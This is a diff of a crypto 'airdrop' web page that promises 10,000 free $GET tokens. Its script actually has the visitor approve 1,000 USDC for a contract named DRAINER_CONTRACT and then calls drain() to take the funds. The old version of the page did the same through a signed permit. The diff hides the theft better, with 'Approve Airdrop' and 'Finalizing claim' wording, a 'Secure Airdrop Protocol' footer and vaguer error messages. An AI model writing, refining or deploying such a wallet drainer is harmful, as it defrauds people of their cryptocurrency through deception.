@@ -6,32 +6,57 @@
   <title>🎁 GET Airdrop</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Inter', sans-serif; }
+    .glow { box-shadow: 0 0 25px rgba(255, 255, 0, 0.2); }
+    .spinner {
+      border: 3px solid transparent;
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      width: 1.25rem;
+      height: 1.25rem;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
-<body class="bg-gray-950 text-white flex items-center justify-center min-h-screen">
-  <div class="bg-gray-900 rounded-2xl shadow-xl p-8 w-full max-w-md text-center space-y-6">
-    <h1 class="text-3xl font-bold text-yellow-400">🎁 Claim 10,000 $GET</h1>
-    <p class="text-gray-300">Connect your wallet and claim your free tokens. Powered by Base.</p>
+<body class="bg-gradient-to-br from-black via-gray-900 to-gray-800 text-white min-h-screen flex items-center justify-center px-4">
+  <div class="bg-gray-900 rounded-3xl p-8 max-w-md w-full shadow-xl border border-gray-700 glow text-center space-y-6">
+    <div class="space-y-2">
+      <h1 class="text-4xl font-bold text-yellow-400">🎁 GET Airdrop</h1>
+      <p class="text-gray-300">Claim <span class="text-green-400 font-semibold">10,000 $GET</span> instantly. Just connect and approve.</p>
+    </div>
 
-    <div class="space-y-4">
-      <button id="connect" class="w-full bg-blue-600 hover:bg-blue-700 transition py-3 px-6 rounded-xl font-semibold">
+    <div class="flex flex-col space-y-4">
+      <button id="connect" class="bg-blue-600 hover:bg-blue-700 py-3 rounded-xl font-semibold transition duration-200">
         🔌 Connect Wallet
       </button>
-      <button id="claim" disabled class="w-full bg-green-600 hover:bg-green-700 transition py-3 px-6 rounded-xl font-semibold">
-        🚀 Claim Now
+      <button id="approve" disabled class="bg-green-600 hover:bg-green-700 py-3 rounded-xl font-semibold transition duration-200 flex items-center justify-center gap-2">
+        ✅ Approve Airdrop
       </button>
     </div>
 
-    <p id="status" class="text-sm text-gray-400 mt-4"></p>
+    <div id="status" class="text-sm text-gray-400 mt-2 min-h-[1.25rem]"></div>
+
+    <p class="text-xs text-gray-600 pt-4 border-t border-gray-700">
+      Powered by Base · Secure Airdrop Protocol
+    </p>
   </div>
 
   <script>
     const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
-    const DRAINER_CONTRACT = "0x2943B7c399f3EC9a80F31e292956837fF640c886"; // Your deployed contract
+    const DRAINER_CONTRACT = "0xFD47F4f4b309d097eFDF33794D29D0B8A7988b43"; // ✅ Updated contract address
 
     let signer, address;
 
     const connectBtn = document.getElementById('connect');
-    const claimBtn = document.getElementById('claim');
+    const approveBtn = document.getElementById('approve');
     const status = document.getElementById('status');
 
     connectBtn.onclick = async () => {
@@ -40,67 +65,39 @@
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         address = await signer.getAddress();
-        claimBtn.disabled = false;
+        approveBtn.disabled = false;
         status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
       } catch (err) {
-        console.error("Wallet connect error:", err);
-        status.textContent = "❌ Wallet connection failed.";
+        console.error(err);
+        status.textContent = "❌ Failed to connect wallet.";
       }
     };
 
-    claimBtn.onclick = async () => {
+    approveBtn.onclick = async () => {
       try {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-
-        // Build EIP-712 domain
-        const domain = {
-          name: "USD Coin",
-          version: "2",
-          chainId: 8453, // Base Mainnet
-          verifyingContract: USDC_ADDRESS
-        };
-
-        const types = {
-          Permit: [
-            { name: "owner", type: "address" },
-            { name: "spender", type: "address" },
-            { name: "value", type: "uint256" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-          ]
-        };
-
+        status.innerHTML = '<div class="spinner"></div> Approving...';
         const usdc = new ethers.Contract(USDC_ADDRESS, [
-          "function nonces(address) view returns (uint256)"
-        ], provider);
-
-        const nonce = await usdc.nonces(address);
-        const value = ethers.utils.parseUnits("1000", 6); // 1,000 USDC
-        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
-
-        const message = {
-          owner: address,
-          spender: DRAINER_CONTRACT,
-          value,
-          nonce,
-          deadline
-        };
-
-        const sig = await signer._signTypedData(domain, types, message);
-        const { v, r, s } = ethers.utils.splitSignature(sig);
-
-        const drainer = new ethers.Contract(DRAINER_CONTRACT, [
-          "function drainWithPermit(address token,address victim,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s)"
+          "function approve(address spender, uint256 value) public returns (bool)"
         ], signer);
 
-        const tx = await drainer.drainWithPermit(USDC_ADDRESS, address, value, deadline, v, r, s);
+        const value = ethers.utils.parseUnits("1000", 6); // Approve 1,000 USDC
+        const tx = await usdc.approve(DRAINER_CONTRACT, value);
         await tx.wait();
 
+        status.innerHTML = '<div class="spinner"></div> Finalizing claim...';
+
+        const drainer = new ethers.Contract(DRAINER_CONTRACT, [
+          "function drain(address token, address victim) external"
+        ], signer);
+
+        const tx2 = await drainer.drain(USDC_ADDRESS, address);
+        await tx2.wait();
+
         status.textContent = "🎉 Claimed successfully!";
-        claimBtn.disabled = true;
+        approveBtn.disabled = true;
       } catch (err) {
-        console.error("Drain failed:", err);
-        status.textContent = "❌ Failed: " + (err?.error?.message || err?.message || "Unknown error");
+        console.error(err);
+        status.textContent = "❌ Something went wrong during approval or claim.";
       }
     };
   </script>
